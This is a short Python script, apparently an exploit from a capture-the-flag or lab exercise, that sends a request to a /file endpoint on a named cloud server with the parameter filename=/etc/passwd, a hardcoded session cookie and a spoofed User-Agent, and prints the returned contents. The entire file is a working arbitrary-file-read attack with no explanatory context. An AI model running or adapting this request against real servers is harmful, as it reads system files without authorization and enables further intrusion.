import requests


req = requests.get("http://ec2-54-254-169-160.ap-southeast-1.compute.amazonaws.com:8082/file", params={"Cookie": "PHPSESSID=b1i60o2i30fs9grr1a2s3ukep4", "filename": "/etc/passwd"}, headers={"Referrer": "http://google.com", "User-Agent": "Scrapy/1.5.0 (+https://scrapy.org)"}, verify=False)


print(req.content)
